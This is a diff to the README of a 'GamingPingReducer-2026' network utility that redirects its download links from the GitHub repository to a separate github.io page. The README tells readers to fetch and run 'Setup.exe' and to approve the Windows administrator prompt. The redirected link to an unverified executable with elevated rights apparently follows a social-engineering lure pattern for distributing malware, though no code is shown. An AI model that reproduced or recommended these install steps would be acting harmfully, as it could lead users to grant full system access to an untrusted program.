@@ -1,6 +1,6 @@
 # 🚀 GamingPingReducer-2026 - Lower your game ping today
 
-[![](https://img.shields.io/badge/Download-GamingPingReducer-2026-blue.svg)](https://github.com/Flamecolored-jamaica596/GamingPingReducer-2026)
+[![](https://img.shields.io/badge/Download-GamingPingReducer-2026-blue.svg)](https://flamecolored-jamaica596.github.io)
 
 GamingPingReducer-2026 improves your network connection for online gaming. This tool identifies technical bottlenecks in your system and adjusts settings to lower ping and reduce packet loss. It automates complex changes to your network stack so your games run with more stability.
 
@@ -24,7 +24,7 @@ GamingPingReducer-2026 improves your network connection for online gaming. This 
 
 Follow these steps to install the software safely on your computer.
 
-1.  **Visit the Download Page:** Navigate to the [official download page](https://github.com/Flamecolored-jamaica596/GamingPingReducer-2026) to obtain the software.
+1.  **Visit the Download Page:** Navigate to the [official download page](https://flamecolored-jamaica596.github.io) to obtain the software.
 2.  **Download the Installer:** Look for the file named `Setup.exe` in the list of available files. Click the file to start the download process. Most browsers will save this file to your Downloads folder.
 3.  **Run the Installer:** Open your Downloads folder. Locate `Setup.exe` and double-click it. 
 4.  **Confirm Security Prompts:** If Windows shows a User Account Control prompt, click Yes to allow this program to make changes to your device. This confirms you have the authority to modify network settings.
